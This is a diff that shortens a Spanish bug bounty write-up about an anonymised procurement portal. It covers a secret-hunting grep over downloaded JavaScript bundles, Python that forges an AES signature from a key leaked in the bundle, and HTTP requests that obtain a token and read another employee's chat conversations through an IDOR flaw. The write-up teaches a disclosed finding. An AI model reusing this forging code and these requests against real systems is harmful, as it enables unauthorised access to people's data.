@@ -24,48 +24,16 @@ takeaways:
   - "Demuestra el acceso con una cuenta canario tuya. Nunca con los datos de una persona real."
 ---
 
-Este es el hallazgo del que más orgulloso estoy, y paradójicamente el más fácil de
-encontrar: estaba a la vista, en un fichero que el propio servidor le entrega a cualquiera
-que abra la página. Es un recordatorio brutal de que **lo que llega al navegador es
-público**, aunque esté minificado y parezca ilegible.
-
-<div class="warn" markdown="1">
-**Todo está anonimizado.** El programa autorizó la publicación con la condición de no
-identificar al producto. He cambiado la empresa, los dominios, las rutas, los nombres de
-los campos y, por supuesto, **la clave real no aparece**: las que ves aquí son de ejemplo.
-El mecanismo es exacto.
-</div>
-
-## El objetivo
-
-Un **portal interno de compras** de una multinacional, accesible desde internet. El tipo
-de aplicación donde trabajan cientos de empleados: pedidos, proveedores, facturas,
-contratos. Entre sus funciones había un asistente conversacional interno, y ahí es donde
-me metí.
-
-## Paso 1: leer el JavaScript, que es gratis
-
-Cuando abres una web, tu navegador se descarga ficheros `.js` con toda la lógica del lado
-cliente. Están minificados —comprimidos, sin espacios ni nombres legibles— pero **no
-cifrados**. Minificar no es proteger: es ahorrar bytes.
-
-Lo primero que hago en cualquier objetivo es bajarme todos los bundles y buscar palabras
-que delaten secretos:
+Lo que llega al navegador es público, aunque esté minificado. Minificar ahorra bytes, no
+protege nada. Me bajé los bundles del portal y busqué lo de siempre:
 
 ```bash
-# descargar los .js que carga la página
-grep -oE 'src="[^"]+\.js"' pagina.html | cut -d'"' -f2 | while read u; do
-    curl -s "https://portal.ejemplo.tld$u" -o "bundles/$(basename $u)"
-done
-
-# y buscar lo que suele estar donde no debe
 grep -rniE 'secret|api[_-]?key|password|token|private[_-]?key|encrypt|sign' bundles/
 ```
 
-En uno de los ficheros apareció esto:
+En uno de ellos:
 
 ```javascript
-// bundle minificado, reformateado para que se lea
 var cfg = {
     system_code: "SRM",
     secret_key:  "a1b2c3d4e5f60718293a4b5c6d7e8f90",   // ← clave de ejemplo
@@ -80,29 +48,16 @@ function encryptUserTime(datos) {
 }
 ```
 
-Una clave AES-256. En un fichero público. Servida a cualquiera que entre en la web.
+Una clave AES-256 servida a cualquiera que abra la web.
 
-## Paso 2: la pregunta correcta no es «¿hay una clave?» sino «¿para qué sirve?»
+## Para qué servía
 
-Aquí es donde mucha gente se precipita. Encontrar una cadena que parece una clave **no es
-un hallazgo**. Hay claves públicas por diseño: identificadores de Firebase, claves
-publicables de pasarelas de pago, tokens de mapas. Reportar una de esas te gana un
-«informativo» y algo de vergüenza.
-
-<div class="note" markdown="1">
-**La regla que uso:** una clave filtrada no vale nada por sí misma. **Lo que vale es lo que
-esa clave abre.** No reportes el secreto: reporta la puerta.
-</div>
-
-Así que seguí la función. ¿Quién llama a `encryptUserTime` y qué hace con el resultado?
+Una clave filtrada no vale nada por sí misma; vale lo que abre. Hay claves públicas por
+diseño —Firebase, pasarelas de pago, mapas— y reportarlas te gana un informativo. Así que
+seguí la función.
 
 ```javascript
-// más abajo, en el mismo bundle
-const firma = encryptUserTime({
-    username:  "SRM",
-    timestamp: Date.now(),
-    nonce:     "aleatorio123"
-});
+const firma = encryptUserTime({ username: "SRM", timestamp: Date.now(), nonce: "aleatorio123" });
 
 fetch("/asistente/auth/v1/app-source/token", {
     method:  "POST",
@@ -111,13 +66,9 @@ fetch("/asistente/auth/v1/app-source/token", {
 });
 ```
 
-La aplicación cifra un texto con esa clave y se lo manda al servidor. El
-servidor lo descifra, ve que el resultado tiene sentido y concluye: *«si has sabido cifrar
-esto, eres mi aplicación legítima»*. Y te da un pase de entrada.
-
-El problema es evidente en cuanto lo dices en voz alta: **si la clave está en el fichero
-que yo me he descargado, yo también sé cifrarlo.** El servidor no está comprobando quién
-eres. Está comprobando que tienes un secreto que le ha dado a todo el mundo.
+El servidor descifra eso y concluye «eres mi aplicación legítima». Pero la clave venía en
+el fichero que yo me había descargado, así que yo también sé cifrarlo. No comprueba quién
+eres: comprueba que tienes un secreto que ha repartido a todo el mundo.
 
 <figure>
   <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/02-clave-en-el-navegador.svg' | relative_url }}"
@@ -125,13 +76,11 @@ eres. Está comprobando que tienes un secreto que le ha dado a todo el mundo.
   <figcaption>El mismo fichero llega a los dos. Y con él, la misma clave.</figcaption>
 </figure>
 
-## Paso 3: fabricar un pase, sin tener cuenta
-
-Reproduje la firma fuera del navegador. Sin usuario, sin contraseña, sin cookie:
+## Fabricar el pase
 
 ```python
 import json, time, base64, os
-from Crypto.Cipher import AES          # la clave sale del bundle público
+from Crypto.Cipher import AES
 
 CLAVE = bytes.fromhex("a1b2c3d4e5f60718293a4b5c6d7e8f90")   # ejemplo
 iv    = os.urandom(16)
@@ -144,16 +93,12 @@ texto = json.dumps({
 
 relleno = 16 - len(texto) % 16
 cifrado = AES.new(CLAVE, AES.MODE_CBC, iv).encrypt(texto + bytes([relleno]) * relleno)
-
-firma = base64.b64encode(iv + cifrado).decode()
+firma   = base64.b64encode(iv + cifrado).decode()
 ```
-
-Y con eso, al endpoint:
 
 ```http
 POST /asistente/auth/v1/app-source/token HTTP/2
 Host: portal.ejemplo.tld
-Content-Type: application/json
 X-System-Code: SRM
 
 {"signature":"<la firma que acabo de fabricar>"}
@@ -177,12 +122,12 @@ HTTP/2 200 OK
   <figcaption>El mismo token, decodificado: <code>scope: "read write"</code>.</figcaption>
 </figure>
 
-Un token válido. Con permisos de **lectura y escritura**.
+Lectura y escritura, sin tener cuenta.
 
-## Paso 4: el segundo fallo, que es el que de verdad duele
+## El segundo fallo, que es el que duele
 
-Tener un token no es tener los datos de alguien. Lo normal sería que ese pase sirviera solo
-para lo tuyo. Así que probé a pedir datos de **otra persona**:
+Un token no son los datos de nadie. Lo normal sería que sirviera solo para lo mío. Pedí
+los de otra persona:
 
 ```http
 POST /asistente/chat/v1/get_conversation HTTP/2
@@ -192,58 +137,32 @@ X-Authorization: <mi token fabricado>
 {"user":"empleado.objetivo"}
 ```
 
-Y llegaron. Las conversaciones de ese empleado, por cientos.
-
 <figure>
   <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/04-datos-de-otro.png' | relative_url }}"
        alt="Peticion con el token fabricado y, en el cuerpo, el nombre de otro empleado. La respuesta devuelve conversaciones cuyo userId es ese mismo empleado, y el buscador cuenta 300 coincidencias">
   <figcaption>Basta con escribir el nombre de otro en el cuerpo. La respuesta trae sus conversaciones —el <code>userId</code> es el suyo, no el mío— y el buscador cuenta <strong>300</strong>. El usuario real va tapado; es una persona.</figcaption>
 </figure>
 
-El token que fabriqué no dice **quién soy**. Y la API, en vez de
-deducirlo del token, me deja escribirlo yo en el cuerpo de la petición. Es como un billete
-de tren sin nombre donde el revisor te pregunta «¿y tú cómo te llamas?» y se fía de la
-respuesta.
+El token no dice quién soy, y la API, en vez de deducirlo de él, me deja escribirlo yo en
+el cuerpo. Eso es BOLA, o IDOR: comprueba que has entrado, no que lo que pides sea tuyo.
 
-A esto se le llama **BOLA** (*Broken Object Level Authorization*) o IDOR, y es el fallo
-número uno de las APIs modernas. La aplicación comprueba que has entrado, pero no comprueba
-que lo que pides sea tuyo.
-
-Esta es la parte importante para quien está aprendiendo: **el hallazgo no es la clave**.
-La clave es la puerta. Lo que hace que esto sea crítico es la combinación:
+El hallazgo no es la clave. Es la combinación:
 
 | Pieza | Por sí sola | Combinada |
 |---|---|---|
-| Clave en el bundle | Preocupante, pero quizá solo firma peticiones anónimas | Permite fabricar pases |
-| El token no va atado a un usuario | Malo, pero necesitas un token | Con el pase fabricado, entras como quien quieras |
+| Clave en el bundle | Quizá solo firma peticiones anónimas | Permite fabricar pases |
+| El token no va atado a un usuario | Necesitas un token | Entras como quien quieras |
 | La API acepta el usuario en el cuerpo | Mal diseño | **Lees los datos de cualquier empleado** |
 
-Tres decisiones que, por separado, alguien podría defender. Juntas, un crítico.
+## Dónde paré
 
-## Paso 5: hasta dónde llegar — y dónde parar
+Podía haber descargado las conversaciones de cientos de empleados. No lo hice: para
+demostrar que la puerta se abre no hay que vaciar la casa. Las escrituras las probé contra
+una conversación mía, con identificador aleatorio. Lo que apareció en pantalla no se
+guardó y en el reporte va tachado.
 
-Aquí hay una decisión ética que no es opcional.
-
-**Podía** haber descargado las conversaciones de cientos de empleados para engordar el
-reporte. **No lo hice**, y no deberías hacerlo tú:
-
-- Para demostrar el fallo basta con **enseñar que la puerta se abre**, no con vaciar la
-  casa. Un listado que prueba el acceso es suficiente.
-- Las operaciones de escritura las probé contra **una conversación mía**, creada por mí,
-  con un identificador aleatorio. Nunca contra nada de una persona real.
-- Los datos personales que aparecieron en pantalla no se guardaron, no se copiaron y en el
-  reporte van tachados.
-
-<div class="note" markdown="1">
-**Por qué esto importa más que el bug.** El alcance de casi todos los programas prohíbe
-explícitamente acceder a datos de usuarios reales más allá de lo imprescindible. Pasarte de
-ahí convierte tu reporte en un incidente, y a ti en el incidente. La diferencia entre un
-investigador y un problema es exactamente esta línea.
-</div>
-
-También encontré, por el mismo camino, un endpoint que devolvía **sin ninguna
-autenticación** la clave de un servicio externo de pago. Esa la reporté tachada, sin usarla
-ni una vez: tener la llave no te da derecho a abrir la puerta.
+Por el mismo camino salió un endpoint que devolvía sin autenticación la clave de un
+servicio externo de pago. La reporté tachada, sin usarla.
 
 ## Impacto
 
